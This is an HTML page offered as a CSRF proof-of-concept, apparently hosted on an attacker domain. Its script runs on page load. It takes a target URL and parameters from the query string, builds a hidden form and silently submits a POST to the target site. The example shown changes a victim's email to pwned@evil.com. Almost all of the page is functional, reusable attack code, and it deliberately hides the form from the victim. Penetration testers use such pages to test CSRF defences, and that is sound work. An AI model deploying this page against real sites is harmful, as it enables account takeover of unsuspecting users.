<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic CSRF Attack PoC - Attacker Origin (pipelock.dev)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #1a1a1a; color: #eaeaea; }
        .container { background-color: #2b2b2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); }
        h1 { color: #00CC66; border-bottom: 2px solid #00CC66; padding-bottom: 5px; }
        .note { margin-top: 20px; padding: 10px; background-color: #3e3e3e; border-left: 5px solid #00CC66; color: #eaeaea; }
        #status { font-weight: bold; margin-top: 15px; color: #00AEEF; }
        #post-data { background-color: #3e3e3e; padding: 10px; border-radius: 4px; }
        /* Hide the form to make the attack "silent" for the victim */
        #csrfForm { display: none; } 
    </style>
</head>
<body>
    <div class="container">
        <h1>Cross-Site Request Forgery (CSRF) PoC</h1>
        <p><strong>Origin:</strong> Hosted on <code>https://pipelock.dev</code> (Attacker Domain).</p>

        <div class="note">
            <strong>PoC URL Example:</strong> <code>https://pipelock.dev/csrf_attack.html?url=https://target.com/change-email&new_email=pwned@evil.com&csrf_token=</code>
            <br>
            (Note: Leaving `csrf_token` blank tests for missing or poorly implemented token checks.)
        </div>

        <h2>Attack Details</h2>
        <p><strong>Target URL:</strong> <code id="target-url-display">N/A</code></p>
        <p><strong>POST Parameters to be Sent:</strong></p>
        <pre id="post-data">No data yet.</pre>

        <p id="status">Status: Preparing attack payload...</p>
        
        <form id="csrfForm" method="POST" action=""></form>

        <script>
            function runCsrfAttack() {
                const urlParams = new URLSearchParams(window.location.search);
                const targetUrl = urlParams.get('url'); 
                const form = document.getElementById('csrfForm');
                const statusElement = document.getElementById('status');
                const postDataElement = document.getElementById('post-data');
                let postDataDisplay = '';

                if (!targetUrl) {
                    statusElement.textContent = "ERROR: No target URL specified. Use the 'url' parameter.";
                    return;
                }

                document.getElementById('target-url-display').textContent = targetUrl;
                form.setAttribute('action', targetUrl);
                
                let inputsAdded = 0;
                for (const [key, value] of urlParams.entries()) {
                    if (key === 'url') { continue; } 
                    
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = value;
                    form.appendChild(input);
                    
                    postDataDisplay += `\n${key}: ${value}`;
                    inputsAdded++;
                }

                if (inputsAdded === 0) {
                    postDataElement.textContent = "WARNING: No POST parameters were provided via the URL.";
                    statusElement.textContent = "WARNING: No POST data found. Attack aborted.";
                    return;
                }
                
                postDataElement.textContent = postDataDisplay.trim();
                
                statusElement.textContent = `SUCCESS: Submitting CSRF form to ${targetUrl} with ${inputsAdded} parameters...`;
                form.submit();
                
                setTimeout(() => {
                    statusElement.innerHTML = "<strong>CSRF request sent.</strong><br>Vulnerability confirmation relies on checking the target site's server logs or the victim's account state (e.g., password/email changed).";
                }, 500);
            }

            runCsrfAttack();
        </script>
    </div>
</body>
</html>
